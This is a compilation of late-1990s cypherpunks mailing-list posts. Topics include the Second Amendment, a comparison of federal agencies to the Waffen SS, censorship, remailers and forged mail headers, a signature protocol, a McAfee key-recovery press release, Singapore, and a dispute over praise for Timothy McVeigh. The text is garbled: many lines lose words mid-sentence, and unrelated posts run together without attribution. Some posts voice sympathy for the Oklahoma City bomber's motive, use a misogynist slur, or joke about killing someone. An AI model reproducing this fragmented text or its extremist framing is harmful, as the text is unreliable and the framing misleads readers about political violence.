that supposedly differentiates it from some gang of bandits that
down from the hills and extracts tribute for as long as the coast
clear -- is the Constitution.
  The Constitution would have not have been ratified by enough states
take effect without solemn binding promises that a Bill of Rights
quickly be enacted. Without the Bill of Rights, the Constitution is
and of no force.
  The Bill of Rights prominently features the Second Amendment, which
instructs us: "A well regulated Militia, being necessary to the
security of
a free State, the right of the people to keep and bear Arms, shall not
  This is a founding principle of our nation. Should the national
government eviscerate or foreswear that principle, it is not only our
right, but our duty, in Jefferson's words, to "alter or abolish it,
and to
institute new Government."
  The founding document does not find ANY role for a standing,
army in  preserving "the security of a free state." As a matter of
the founders traveled the land, preaching the EVILS of a professional,
standing army. And they were right.
  Our domestic, professional, standing army today consists of
legions, somewhat on the Roman model but also on the model of the
personalized Waffen SS Divisions created as adjuncts to Hitler's
with personal loyalty oaths sworn to the Fuhrer, and customized
adopted with silver dagger or death's-head totems, etc.
  Currently going through precisely the kind of expansion and rearming
transformed Hitler's personal bodyguard from the scruffy SA
brownshirts of
1934, to the well-armed, professional SS divisions of 1940, our own
paramilitary legions are today dubbed "ATF, "FBI," "FBI Hostage
"DEA," etc.
  Some of these units now number in the THOUSANDS, and are authorized
deploy COMBAT AIRCRAFT. They routinely train with precisely the kinds
explosives and automatic weapons you or I could go to prison for
possessing, and practice rapid helicopter deployment and "dynamic
into URBAN AREAS. These guys are not just getting ready to investigate
next Lindbergh kidnapping.
  Can such outfits exist in parallel with a strong citizen militia?
WILL not, and they are currently demonstrating this to us in spades,
infiltrating with agents provocateurs every legitimate citizen militia
they can find, framing the leaders on amorphous "conspiracy" charges,
sending them away for decades.
  As they say in the popular sword and costume series, "There can be
only one."
  But what is equally important, is to realize that a citizen militia
ADEQUATE to defend the security of a free state, even against the
most powerful, most technologically advanced power in the world.
  George Washington proved this in 1781. And for anyone who harbored
illusion that "conditions have so changed in 200 years" that this was
longer the case, the Vietnamese and then the Afghans successively
proved it
again, in our own lifetimes.
  Next time: Do we need a standing army, at all?

I'm a Frisbeetarian. I believe that, when you die, your soul goes up

  Nonethemore, I take umbrage at much of the recent Christian-bashing
taking place on the cypherpunks list. Bash Pat Robertson, 'make fun' of Jesus, but please, stop painting with the wide brush. If I claim to speak for the cypherpunks, then I would expect to be roundly booed
and set upon by Mongers with long teeth and shot at by whoever May
choose to do so. I expect the same for Pat Robertson when he speaks
for Jesus. He's an asshole!
  However, the cypherpunks mailing list serves a purpose for giving
us a forum to discuss and debate issues that are important to us, and
the Christian faith does likewise for those who think evolution is
a Satanist plot, and Jesus plays goalie for the Chicago Blackhawks.
(Jesus Saves! {But Gretsky puts in the rebounds.})
  Uuuhhh...forget what I just said. Let's kill this fucker and

creeping tyranny and corresponding usurpment of human rights that is

  Even more depressing is the realization that I am a cloistered type

this probably indicates that I am only seeing the tip of the iceberg

  Aren't we safe, yet?
  With the thousands of laws that have been generated for our protection
over the last few years, shouldn't we be *more* safe now, rather than
*less* safe?
  Since our safety seems to depend on the erosion of our Constitutional
rights, could the problem be that our rights aren't being eroded *fast*
enough? Should we be pressing the government for immediate suspension
of *all* of our Constitutional rights, so that we can achieve total
safety *immediately*?
  Or should I go hide out at my family's cabin at Ruby Ridge until the
government has finally made the rest of the world safe for me?

~"Whether it's CPAC wanting to nuke all web sites containing the word 'boy,' Senator Swinestein wanting to nuke all web sites containing the word 'bomb,' or Senator Hatch wanting to nuke all web sites containing the word 'sex,'" writes Mike Duvos in a Cypherpunks newsgroup, "the optimal strategy for service providers has turned out to be to quietly remove any material some squeaky wheel is uncomfortable with, keep proclaiming themselves to be the strongest supporters of free speech in the entire Net community, and stonewall when asked questions which might suggest anything to the contrary."   Sounds like one of them-thar, cynical, irreverent, shit-disturbing
CypherPunks, to me.
~Now, the pages are back online on a small server in Germany. Organizers of the site are raising funds to purchase their own direct connection to the Net. However they don't want their computer to be in the US-- but not because they plan to violate any US laws. "We are very nervous
about being here," says Jim Finn, who helps run the Free Spirits, "if the government is going to use underhanded tactics to intimidate our providers and possibly confiscate our equipment." In the course of investigations, police frequently seize computers that they never return, even when they file no charges.   Perhaps Germany should start building refugee camps for American
homosexuals, Jews, and producers of strong encryption.
~If the Internet had sprung up in the 50s, Senator Jesse Helms would be riling his white constituents about the scandalous web sites promoting interracial marriage and civil rights. The right way to answer to Helms and his ilk is not with pacifying assurances that, thanks to filtering, people can avoid these offensive ideas, but to confront the underlying racism. Now that queer sex is the bugaboo, the answer shouldn't be any different.   CypherPunk Cult of One Project:?:
  Put up a website containing quotes from Jesse Helms and other high-
profile politicians, public figures, etc., and then actively promote
it being censored and removed from the InterNet.
  (Pictures of a topless Princess Di, etc. Naked children from a "Life"
   magazine photo from the '60's, etc.)
  Has anyone ever sued themselves to have their own site censored and
  "Greg Broiles vs. Greg Broiles" (Kind of has a 'ring' to it.)
~That censorship is bad and dangerous no matter who its victims is a concept best grasped today by Cypherpunks steeped in computers and the Net.   And who came out of internment in the legendary "Flame Camps"
of the late 1990's, vowing, "Never Forgive. No Prisoners."
~Whether it's the painting "Mona Lisa" or the sex video Lisa Moaning,   WHY DON'T THESE PEOPLE PROVIDE *POINTERS*!!!
  (No, *not* to the "Mona Lisa," you idiot!)
~If hysteria over drugs or hate speech or pornography becomes intense enough, then no one's data-- which is to say no one's privacy-- is safe. Much better than civil libertarians and gay politicos, Internet activists have seen the danger in the new wave of repressive laws. Whether they can articulate that danger to a broader public remains to be seen. If not, the 1990s may be recalled as a short-lived golden age of free expression on the Net, and free spirits won't have any place to call home. **   "Give me bandwidth, or give me death."
  "Give me your huddled electrons, struggling to be free."
  "Now is the time for all good hackers to come to the aide of
  "One if by land. Two if by sea. NULL if by Net."

     4.   I  have  been  advised  by  the  Federal  Bureau  of
Investigation that the public release of the identity of the two
victims could cause serious financial and security difficulties for
the victims.  Until now, the victims have been identified only to
the defense, as part of the criminal discovery in the case.
  Silly me, I thought the people who had their credit card information
exposed were the victims.
     5.   The  difficulties  facing  these  victims  include  the
probability that additional hackers will seek to challenge these
computer systems,  once the defendant's successful efforts are
revealed; and the loss of business due to the perception by others
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
that computer systems may be vulnerable.
  Uh... Excuse me, Dude, but I believe that's how life works. Unless,
of course, the government steps in to cover up the facts to the benefit
of rich corporations and to the detriment of their gullible customers.
     8.   The defendant's counsel was contacted regarding this
motion.  She expressed a willingness to agree to it, but only if
the  government  agreed to  limit  in some way the  government's
appropriate public release of the defendant's guilty pleas as a
deterrent to others.   Such an arrangement was not acceptable to
the government.  Defendant's counsel therefore indicated that she
would like to file an opposition to this motion; but would agree
that pending the resolution of this issue, that the identities of
the victims could be protected.
  The cunt sold her client down the river for a good tee time with

"Smak" delivered an encrypted CD containing over 100,000 stolen credit card numbers. After the validity of the credit card information
was confirmed through decryption of the data on the CD, "Smak" was taken into custody by the FBI.   And the 100,000 people were immediately notified that their credit
cards had been compromised? I fucking doubt it. Better to screw over

The purpose of a remailer is to allow the sender to be anonymous, so
it strips real headers to prevent accidents (eg. subject fields

Then it has to allow you to put headers back in otherwise you can't
interoperate with software.  Eg pasting in References:, Subject: (I
would like to see Cc: and Bcc: being allowed to be pasted in also).
I would also like to see From: pasted in.  In fact I can see no
purpose to restrict what can be pasted in, other than to reduce
complaints to the remailer operator possibly.
It's easy enough to allow From:.  I do it myself sometimes, and notice
Nerthus does also, pasting in From fields works at least with Replay
as the exit node, but that results in two From fields.
My software shows be all headers.  I am not sure what other software
would do, probably, only display the first From field (the remailers).
I would have thought remailers are not actually trying to advertise
their From fields.  Perhaps allowing bogus From fields, or even
putting in remailer at dev.null if there is not a From field would
greatly reduce complaints from clueless users.
If you want to you can always put in Sender: remailer at anon.efga.org.
That'd do.
However you'll notice that my address is:

How, exactly?  We're not talking about computers as "the technology".
We mean anonymous remailers, digital cash, Chaumian credentials,
steganography, and other cypherpunk technologies.  Who is using these
technologies to make more money today?  Almost no one.  The reason is
that the market is far too small.  You can't put together a business
plan and attract the investment needed if there are only a few hundred
cypherpunks as customers.
Totally different.  The point is not to trade, it is to do so anonymously
and confidentially.  You yourself are always whining about how you can't
buy and sell your stocks privately, all your financial status being
known to the state.  Cypherpunk technologies are useless unless all
parties to a transaction are using them.  If even one party is subject
to government or criminal surveillance then other participants will be
forced to report the transaction as well.
The only hope for these technologies is to spread the base of people using
them.  It doesn't do any good to use anonymous ecash if no one will accept
it for payment.  You can't make a living as a nym until there are enough
people using these technologies that a business can succeed via anonymous
contracting.  It all depends on getting a critical mass of users.

There's a fallacy which is quite common on this list, especially among
members whose positions are otherwise indefensible.  It's surprising in
a way because this fallacy is more common among statists.
There, the fallacy goes like this: if it is immoral, then it must be
illegal.  We see this all the time.  People think of the government as
their way of expressing moral values.  Drugs are wrong, so they must be
made illegal.  Discrimination in employment is wrong, so it also must
be illegal.  We have countless bad laws based on this false premise.
On this list we see the same fallacy, turned around: if it is legal, it
must be moral.  Someone is attacked for posting some vicious, hateful,
immoral rant, and they respond that what they said was legal, because of
freedom of speech and the First Amendment.  Their critic must be opposed
to free speech if he objects to their words.
Confusing what is legal and what is moral is a dangerous game.  It leads
to the false reasoning of the statists.  We must remember that there is
a clear distinction between morality and legality.
We all agree with freedom of speech.  People should be able to say
whatever they like without fear of legal consequences.  Cypherpunk
technologies can play a major part in assuring this freedom.
But this does not mean that all speech is equally valid.  If someone
calls for murder and they are attacked for it, it does no good for them to
hide behind the First Amendment.  Their words are wrong - they will have
harmful consequences if followed.  They cheapen life, and work against
the goals we share of a future based on cooperation rather than cooercion.
Cypherpunks are intelligent enough not to be fooled by this attempt
to use the principle of free speech to justify calls for violence and
It's no wonder, really, that people like May and Vulis attempt to confuse
the issue by pretending that their critics are opposed to freedom of
speech.  They know that if they are judged by their own words, their
character is revealed for all to see.  Any smokescreen is welcome if it
helps conceal their vicious, hateful nature.

gburnore+NOspam at netcom.com (Gary L. Burnore)
PGP signing a post is a lot like the new anti-counterfeiting measures in US
currency, only a lot more effective.  But if some bozo decides to start printing
up three dollar bills with a portrait of Mickey Mouse, and others are
foolish enough to accept them, what are you going to do?  It's hard to protect
people from their own stupidity.  I'd contend that a $3 bill isn't even a
counterfeit or forgery, since there is not genuine equivalent which it seeks to
fraudulently duplicate.
Maybe it's time that the brain-dead software that mindlessly harvests e-mail
addresses from the net was shut down.  That sounds like the real problem.
I'm not sure what comment you intended to make about that paragraph, since it
appears that you inadvertantly pasted in your comment from the last paragraph
again.  The text you're supposedly commenting on nowhere mentions PGP.
Since you've already found a solution to the problem that works, there seems
to be no need to do anything more drastic to solve it.
For one thing, to identify posts as originating from one's pseudonym, which *MIGHT* be a "real" e-mail address.  Most times I've seen it used, though, it has been used to place identifying information in the From: field which many newsreaders use to identify posts so that they are recognizeable by the reader.
The key word there is "caught", and then you'd have to convince Netcom to actually
do something about it.  It is my understanding that spammers routinely utilize
Netcom's OPEN SMTP SERVERS to send out their spam, using whatever From: field they
wish, and Netcom doesn't seem to care.  Anyone using those same servers to send mail to a mail2news gateway could forge someone's name and e-mail address to a Usenet post, couldn't they?
Also, even if a complaint to Netcom got an individual account shut down, that wouldn't
stop some other Netcom user from doing the same thing, nor would it stop the first
Netcom user from opening another account under a phony name and repeating the
process, or even doing it from a non-Netcom account.  So if my e-mail address were
being forged via Netcom, would they be able to source-block it as the remailers
currently can do?  If not, doesn't your own ISP have a bigger abuse potential than the
remailer net?
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
There's no need to shout.  Perhaps you've forgotten two earlier posts you made to
this NG in the past couple of weeks in which you said:
-> Subject: Re: Controlling the From: line in PIdaho
-> -> Hopefully replay has corrected this as others have suggested so that the above
-> CAN'T be done.  It's a simple way to forge someone else's name.  Early last

You claimed to be concerned about FORGERY back then, now you're saying "IT'S NOT FORGERY THAT'S A PROBLEM".  Which is the case?
But you were given two solutions, so if one of them works, then you don't need the
other one.

@_subject: Cantsin Protocol No. 2 
Your suggestions were very helpful.  Thank you for making them!
I'm calling the latest version "Cantsin Protocol No.2" and its
identifying number is "25BA1A9F5B9010DD8C752EDE887E9AF3".
It is similar to Cantsin Protocol No. 1, but the bug with the hash of
the public key is fixed.  Instead of concatenating the values p, g,
and y, you concatenate "p: g: y:" and compute the hash.  p,
g, and y should be represented as ASCII hexadecimal digits without
leading 0s.
The hashes should now be correct SHA1 hashes.
My thinking on this is that passes are cheap these days.  I want the
signature to be unobtrusive which probably can't be done if only one
pass is required.
Incidentally, a nice feature of these signatures is that they can be
moved around in the file just by changing the offset.  You don't need
to control the secret key to do it.
The signature checker should ignore bad or incomplete signatures.  I
would consider this to be a bug in the software and not a bug in the
protocol.  A bad signature simply lacks meaning and an error message
need not be reported.
That might seem a little callous, but actually it's how we should
regard signatures.  The current model seems to be "computer, check the
signature on this file and tell me if it's good", whereas the correct
(in my view) model is, "computer, extract all of the material from
this file which is properly signed and throw out the rest."
(Of course, you could imagine a smart editor which highlighted the
areas of a document which were signed by various parties.  It seems a
little early to implement this.)
If it's not authenticated, you shouldn't even look at it.  I've taken
to putting the To: and Subject: header lines at the bottom of my
messages for this purpose.  There's really no need to keep any of the
header fields.
The header fields can be put at the end just as unambiguously as at
the beginning, but at the end they can be signed.
Strictly speaking it's there to save space.  If we put the public key
components in every signature it wouldn't be much harder for the key
management software to compute a hash on them somehow.  This does not
have to be standardized.
ACK!  I knew about this problem, but I couldn't remember exactly how
it worked.  So I said, "Monty, let's not be dumb like those PGP guys.
Let's concatenate the keys together and compute the hash.  Nobody will
Thank you very much for pointing this out.
People who want this feature should type something like "BEGIN CANTSIN
PROTOCOL NO. 2" and "END CANTSIN PROTOCOL NO. 2" into the text at the
right points.
My feeling on this is that this is outside the scope of a signature
protocol.  The protocol should not make any assumptions about what is
being signed nor should it modify what is being signed.
I use LF to terminate lines and would recommend this to others, but it
is not part of the Cantsin Protocol No. 2 specification.
In any event, if we must put in patches to handle the poor fidelity of
electronic mail, the patches should go in afterwards.  When a
signature checking program finds ">From" it should replace it with
"From" and see if it can get the right checksum.  Likewise, it should
try the various line endings until it gets a match.  There can't be
more than about 12 variants, so this shouldn't create an onerous
burden on the machine.  (And, I suppose, it would be possible to add a
field after the length or after the hash which made a suggestion about
the line ending.)
Another great suggestion.  The hashes should be correct now.
Incidentally, in another thread I've been talking about partial
signatures.  The code above is an example of where this would be
useful.  In some countries we are not allowed to express ourselves
freely without persecution.  If I wanted to provably quote somebody
who included forbidden ideas in their message, it wouldn't be possible
without partial signatures.
This might be a good thing to add to a later Cantsin Protocol.
Schneier doesn't mention this, although presumably this information
will show up in one of his references.  Do you know offhand of a
published source which covers this?
This is just intuition, isn't it?  Since we really don't know how hard
it is to factor it seems hard to claim we know the ratio of difficulty
between breaking SHA1 and El Gamal.  Factoring could be broken before
Not that any great science was applied to the choice of a 2048 bit
prime, it just seemed like a good size.  ;-)
Also, I think it is a mistake for people to communicate the strength
of a system by choosing various key lengths based on general popular
views.  It's probably better to say "I estimate this system requires
at least 2^x operations to break."
We've seen this with people choosing short keys so nobody will get the
idea that it is secure.  This just seems all wrong to me.  The key
length is only one way in which a key could be insecure.  Monty
Cantsin's authentication key, for example, is not kept very securely.
But, the way to communicate that is to say "this key is not kept all
that securely."
However, in Cantsin Protocol No. 2 the size of the prime chosen is
completely unspecified.  There doesn't seem to be a reason to restrict
the choice other people will make regarding the length of the prime.
I could imagine choosing a short key for control over a
semi-persistent identity.  The advantage is that you can claim
somebody else brute forced the key for statements you wish to
repudiate.  Similarly, I could imagine choosing an obnoxiously long
key to make it hard for people who don't have super fast machines to
associate with you.

Cypherpunks should be able to provide services which slavers and

connections.  Whatever.  The slavers have things to offer cypherpunks,
whether it's food, construction work, hardware, etc.
Whatever the medium used to trade these services, there is no reason
why the slavers would forego the services they may want.  Assuming
that the Freemen aren't agitating on behalf of the slaves, that is.
We don't need all the slavers to deal, nor do all cypherpunks have to
deal with all slavers.  Just some members of both groups need to get
together and trade.
Standard doctrine, but I no longer believe it is sound.  We've been at
it for years now.  Are the masses using crypto?  I didn't think so.
It's a waste of time to sell to people who think they "have nothing to
hide".  Even if they were using crypto, they would accept snoopware if
it were accompanied with the right media programming.
Which means that instead of proselytizing, it's probably better to
develop systems which we can use which are expensive-to-impossible to
thwart even in hostile environments.
There's no need to turn people away, of course, but begging people to
help themselves is a poor investment.

@_subject: Is Tim May guilty of illegally advocating revolution? 
A ghost speaking through the medium replay.com communicated:
Whether we like it or not, many people are sympathetic with McVeigh.
Some are considering whether actions like bombing Federal buildings
are justified.
It's far far better that these issues are raised and discussed.
You've hit upon something interesting here, Anonymous.  Let's consider
three groups of children.
1. ~100,000 children harmed in Iraq.
2. ~40 children harmed in Oklahoma City.
3. ~20 children harmed outside Waco.
Of these three groups, the third upsets me the most.  Why?  There are
several factors.
One is the extent to which the people committing the actions claim to
represent me.  It is often claimed and widely believed that the
Federal government is acting as a representative for and is answerable
to the American people.  (Allow Monty Cantsin a hollow laugh here.)
That being the case, Waco is far more upsetting than Oklahoma City in
this regard because McVeigh (or whomever) is not thought to represent
a sizeable proportion of the American public.  In the case of Iraq,
this factor raises my concern well above other places in the world
where children are mistreated.
Of the three groups of victims, I identify most strongly with the
people in Waco.  While not strongly religious myself, I respect people
who have unusual beliefs and stick to them.  And I have sympathy for
those who might live in unusual ways.  While I share a culture with
the victims in Oklahoma City, in general we would have little to say
to each other.  I don't know anything about people in Iraq.  This
factor probably governs my feelings on the matter most strongly.
The motivations of the people committing the acts are important.  I do
not believe that McVeigh (accepting the standard paradigm) meant to
kill children.  He certainly meant to kill people who had no
involvement with Waco.  I do not approve of his choice.  I would maybe
even kill somebody to prevent it from happening.  But, one feels
differently when children die more or less by accident than when it is
cold bloodedly premeditated.
In the case of Iraq, it is extremely hard to justify killing kids for
their oil.
The provocation that leads to an act must also be considered.  I am
extremely sympathetic with McVeigh's desire to do something about
Waco, even though I do things less violent and (hopefully) more
effective.  There was no reason whatsoever for the Waco crime to be
committed, likewise people living in the Middle East have not really
committed any provocative act more serious than having oil on their
The mob mentality that seems to have gripped the United States during
the Waco atrocity has a particular horror which is absent in the case
of Oklahoma City and, right now anyway, mostly absent with Iraq.  The
blatant misrepresentation of what was occurring and the degree to
which people were compliant with it is shocking.  There was no serious
attempt to investigate the motivation behind the raid, or even what
was actually occurring from day to day.
The aftermath was even more horrifying.  The government attacks and
murders ~80 innocent people in the most brutal way for no identifiable
reason.  And all anybody can seem to do is to try to protect the
establishment, instead of finding out exactly what happened, instead
of charging the criminals who perpetrated the horror, instead of
taking the necessary actions to make sure nothing like this will ever
be done again by the Federal government, and instead of telling the
The implications of the three situations create varying degrees of
alarm.  I do not expect to see many more bombings.  Bombs are nothing
new.  They've been around for over 100 years and they are a manageable
problem.  Every few decades there's been a big explosion.  It is
unlikely McVeigh will do something like this again.
In the case of Iraq, I'm used to governments behaving this way and I
do not see it directly affecting me very soon.  (Perhaps this is a bit
Waco, however, is quite another matter.  When you watch the footage it
gives you the creeps because what is being reported belongs in the
1940s and the people should be speaking German.  Instead, everybody
speaks English with an American accent and it's happening right now.
When you see an FBI agent justify what happened on the grounds that he
goes to a "normal" church and has a "normal" family, and when you see
other officials state that they wanted to harm the children to
encourage the parents to turn themselves in, the implications are that
we have a very serious problem that will not go away by itself.
Finally, in the case of Waco, the people in charge had all the time in
the world to think very carefully about what they were doing.  They
apparently decided to kill everybody they could, including particular
children whose names they knew, whose pictures they had seen, and some
of whom they may have even spoken to on the telephone.  This really is
hard for me to understand.  I can't imagine what kind of person can do
something like this.
This horror is particular to Waco.  In the case of McVeigh and the
people making policy regarding Iraq, the victims are at least

Let's be generous to the Court and say 10% of these murders are

@_subject: words have value, for good or ill 
It looks like we lost some context across the Atlantic.
In the United States when we are discussing free speech there are
usually some common assumptions that are used to simplify the
discussion.  Usually when free speech is being discussed, we do not
mean contracts, coercive threats, or copyrighted works.  Strictly
speaking, of course, those are speech, but that usually isn't what is
meant over here. (1)
The speech I am talking about is the kind of things which Tim May has
been writing.  To keep things simple, let's consider the statement
"McVeigh did the right thing."  It is not a contract.  It is not a
threat.  It is not copyrighted.
It is simply a belief which Tim May considered and posted to the list.
I think we've fairly settled that it is not immoral to have this
thought.  So the question really is, if you have such a thought, is it
immoral to express it?
It's hard for me to see how.  If the belief is correct, then other
people certainly will benefit from hearing it.  If the belief is not
correct, then other people may be able to enlighten you.  In either
case, it is preferable that the belief be expressed.
I'm not sure I understand what you are proposing.  My dictionary defines
"eradicate" in two ways:
1. to destroy utterly
2. to erase or remove
I don't believe the meme should be "destroyed" and I'm not sure I'm
comfortable with the means that would be required to do this.  Nor do
I see it as desirable to erase or remove posts which have already been
made, if it were even possible.
If you don't like somebody's ideas, I would suggest that you don't
read their messages.  If you don't want to see a particular idea,
perhaps you could hire somebody to remove the posts from your mail
queue that contain it.  If you don't like other people hearing certain
ideas, I recommend you get used to it.
(1) It is interesting to consider a world in which these exceptions
are not made.
If there were no coercive enforcement mechanisms for contracts, then
this exception would not have to exist.  The idea of doing business
solely on the basis of reputation is not only fascinating, but not
very unlike much of the world today.
There are two ways in which threats can be no ops.  One is if the
person being threatened is just a public key whose identity is simply
unknown.  A threat in that case is irrelevant.  The second is if the
person being threatened can adequately protect him or herself in which
case the threat is dangerous to the threatener.
And "intellectual property" is somewhat peculiar and implies a
centralized enforcement mechanism.  If we are to have "intellectual
property" in a worldwide networked environment, it implies a de facto
world government.  The alternative may be preferable.

everything in its power to undermine the development and deployment of

Not only has the use of cryptography been greatly hampered, but
TEMPEST equipment and knowledge is controlled, and there have even
been proposals to control secure operating systems.
Reno's statements and the administration's policies blatantly
contradict each other.  The very technologies which would solve the
problem Reno raises are being discouraged at every opportunity by the
administration she represents.
My question is directed at Declan because he is handy, but any other

Old press release from McAfee boasting Key Recovery Alliance

    CREATE INTERNATIONAL STANDARD FOR RECOVERY OF ENCRYPTION
                                     KEYS
    Key Recovery Alliance to Develop Solutions Which Balance
    the Needs of End- Users, Employers, and International
    Governments
    SANTA CLARA, CALIF. (December 12, 1996) -- McAfee (Nasdaq:
    MCAF), a leading vendor of network security and management
    software, today announced that it has joined the Key
    Recovery Alliance, a coalition of encryption software
    vendors who have joined together to promote international
    specifications for encrypted information. "As a member of
    the Alliance, McAfee will work to create an internationally
    recognized and widely available standard for trusted key
    recovery," said Dan Freedman, vice president of security
    products at McAfee. "Trusted key recovery enables the
    responsible deployment of encryption technologies
    worldwide, while addressing the valid interests and
    security requirements of end-users, employers, and
    government."
    McAfee recently extended its family of network security
    products with the introduction of three new encryption
    solutions. These solutions include PCCrypto for encryption
    of desktop computer files and electronic mail; WebCrypto
    for the encryption of Internet email; and NetCrypto for
    transparent encryption of all communications over TCP/IP
    networks such as corporate intranets and the Internet.
    The Key Recovery Alliance was formed in October, and is
    composed of approximately 40 different network security
    vendors who have joined to cooperate on the development and
    promotion of internationally-accepted standards for
    encryption key recovery. Encryption keys are the codes that
    unlock encrypted information. Encryption key recovery
    refers to the necessary ability to recover lost or damaged
    encryption keys. Common situations in which encryption key
    recovery would be needed include when the death or
    departure of an employee who maintained mission-critical
    encrypted information causes the encryption key to be lost;
    when an encryption key becomes damaged due to a hard disk
    crash; or when a court order warrants the decryption of
    computer-based evidence.
    Company Background
    Founded in 1989, McAfee is a leading worldwide vendor of
    Network Security and Management products for enterprise
    networks. The Company is also a leader in Internet and
    Web-based electronic software distribution. McAfee is

@_subject: Singapore & Freedom 
> I lived and worked in Singapore for 8 years.  Singapore is not
what I call a free society.  Their system has many advantages,
you are pretty much free to make money providing you are doing so
in an area where the government has no interest.  The Singapore
government runs many enterprises and if you happen to be their
competition they will tear you apart to get rid of the
competition.  The Singaporean government tends to cater to the
multinational corporations, who were their earlier ticket to
economic prosperity, and don't do a lot to encourage local grown
business other than to provide a suitable environment for
business, which is good enough on its own.
Singapore is a great place to do business, yours costs are
predictable, something you can not say about the surrounding
countries where corruption makes costs unpredictable.  Singapore
labor is reasonably priced, well-educated, reasonably trained,
and well-disciplined - or at least they don't talk back or
complain unless you try something really stupid.  Singapore
management is expensive, well-educated, but not quite as
versatile as westerners.
Singapore is a social experiment, a group (read PAP) has gained
control and decided to mold the society into something different
than it was.  This is probably a good thing as in the 50s
Singapore was a cesspool, in many ways.  The story goes that you
could smell Singapore 200 miles out, in an airplane.  Everything
that Singapore is today is what it was not in the 50s.
The educational system has been engineered to produce the maximum
number of worker units.  Being a small country with limited
resources (with labor being the main exportable resource) they
could not afford to have an educational system which allowed some
potential worker units to drop-out.  Compare this against the
American system where you are free to succeed, or free to fail,
the choice is basically given to the citizen.  In Singapore this
is not how it works, the blinders are installed early, you are
not permitted to fail to become a good productive member of the
society.  In Singapore you are free, as long as you are a good
productive member of the society.  Try talking back and
complaining about the system and see where that gets you?  I
think they call it Woodbridge.
This social engineering may be a good thing.  Look at the
benefits obtained by Singapore.  In the current economic meltdown
in SE Asia Singapore is only threatened with lower growth.  The
people are happy and they love their country and government, to
the average Singaporean the government can do no wrong.  Most
Western governments would love to be in the same position.
There are costs associated with an engineered society of this
type.  Elder Statesman Lee, he went by Harry Lee before he
learned Mandarin, is always ranting about all the good genetics
being wasted as there is a large number of educated women who
have not married and therefore are not able to reproduce.  Harry
has been ranting about this for more than 10 years.  In a
nutshell certain segments of the population have lost their
ability to mate.  The Singapore government has initiated a
program to help educated Singaporeans find mates.  Great system,
economic prosperity, but what am I supposed to do with this
Don't forget the other good points, no guns or bullets, color
copiers are (were?) restricted, all media controlled by the
government (even Time magazine was banned), mandatory savings
program (CPF), National Service, and the government attitude of
those that are not with us are against us.  Also, don't forget
that the Singaporean government has brought the Big Brother
concept to reality.

What Tim May actually wrote on May 9, 1997, was:
This is not a matter of "understanding" McVeigh's actions.  This is a
matter of agreeing with them, of becoming convinced that he did the right
thing.  It is a totally different position.
Consider: anyone might legitimately say they could understand why the
government opposes access to cryptography.  It represents a threat to
their monopoly power.  But if someone said they were becoming convinced
that restrictions on access to crypto were a good thing, we'd be attacking
them in an instant.  These are two completely different issues.  One is
a matter of understanding evil motivations, which we can all benefit by.
The other is a matter of advocacy of evil.  That must be opposed, and
in fact this list has been a strong force for such opposition.
When Tim May was explicitly offered an opportunity to repudiate his earlier
statement, he refused.  He wrote, in response to that offer:
So there it is in black and white.  Tim May refuses to withdraw his
earlier comments about becoming convinced that McVeigh did the right
thing.  He means what he says and he says what he means.  Yet he attempts
to characterize them in other messages as a matter of "understanding"
McVeigh's actions.  He is trying to have it both ways: powerful rhetoric
followed by mealy-mouthed temporizing.
Perhaps the answer is simply that May does not agree with his earlier
comments, but is too much of a coward to admit that he was wrong.
These mis-characterizations of his views are his attempt to amend and
correct them without having to concede that he, the great Tim May,
made a mistake.
This would not reflect very well on him, but it may be consistent with his
character.  Has May ever admitted to a mistake on any non-trivial matter?
Perhaps not.
The problem this raises is that it is difficult to know where May stands
on any issue.  He makes contradictory statements, refuses to reconcile
them, even refuses to admit that they are contradictory.  Which is his
true view?  No doubt, whichever one turns out to be most convenient in
the end.

All true.  But, in the case of the anonymous post there has usually
been no indication other than writing style and topic that suggests
the poster is using the context of previous anonymous posts.  There's
no particular reason to think the second post has anything to do with
the first.
This means that the ideas cannot be developed to any great depth or
detail.  I would prefer to see anonymous posters include the messages
which supply context or just give the message IDs.
Actually, it's the context and the complexity of the text that
interests me.  If ten different people play the role of anonymous in
one thread, each accepting the context of the previous posters, there
is no reason why that isn't just as interesting as if it were one
And even then it never hurts to think carefully about why they should
be trusted, how it is that they know what they claim to know, and if
there are any ways to verify their claims.
That's okay, though, because you deal with each post on its own merits
one at a time.  If person "C" says "This posts uses the remarks by the
anonymous poster in posts 1, 2, 3,.. as context" then you can say,
"You now say X, but before you said Y, and that's a contradiction."
That person (or even another person) can come back and say something
genuinely interesting like "It seems like a contradiction, but in fact
it isn't for such-and-such a reason."
In practice the way people have been doing this is just by signing
their posts "TruthMonger" or something.  But, message IDs give you
more control over the accepted context.
Sabotaging a non-persistent identity through a remailer is effortless.
Forging takes a little more effort.

I've done it several times, but you seem to be stuck in transmit-only mode.
My "demand" is that you explain YOUR motives for your written demands to Jeff
Burchell that he violate the privacy of ALL of the users of his remailer by
turning over his logs to you and Belinda Bryan , listing the name and address of EVERYONE who either SENT or RECEIVED anonymous e-mail from the Huge Cajones Remailer.  If you don't like hearing that, then you'd better stop asking the same question over and over.
It quite obviously took you by surprise that Jeff chose to reveal to all of
his users just what you and Belinda had attempted.  Did you not want remailer users to know what you'd tried to do?  Contrary to your accusations, not all of Jeff's post was "speculation".  The attempt by staff members of DataBasix to
circumvent the security of the Huge Cajones remailer and violate the privacy of its users was a very FACTUAL statement which you have neither denied nor explained.  No one has to take my word for it.  Anyone who cares to can read if for himself:
   at toad.com/HTML-1997-11/msg00536.html
[Although Gary Burnore has chosen to have his side of that thread removed from
 the archives (for reasons known only to him), Jeff's comments can still be
 found using DejaNews and searching their "old" archives]:
   at wired.com&svcclass=dnold&defaultOp=AND&maxhits=20&ST=QS&format=terse&site=dn
My demands?  To keep the remailers open and usable.  Of the two of us, I'm the
only one who is actually using them (or at least admitting to it).  You're the
one with the least to lose if more get shut down due to harassment of the type
you, Belinda, and William J. McClatchie subjected Jeff Burchell to.  OTOH, if they get shut down, I'd lose my ability to post anonymously and challenge the assertions and false accusations of people like you.  Your pitiful attempt at logic makes no sense.
You've been invited, on several occasions, to start your own remailer if you
REALLY think they're valuable, and you claim to have so much insight into how they "ought to be" run.  You still have not done so.
As for "giving remailers a bad name", perhaps most users would rather they be
usable, full-featured, reliable, secure, and uncensored than that they have a
"good name" with censorious people like you, DataBasix, Janet Reno, and the Church of Scientology.  When have dissidents ever desired a "good name"?  When has being popular ever been more valuable than being free?

I've been looking this over and it's a nice job.  The code is clean
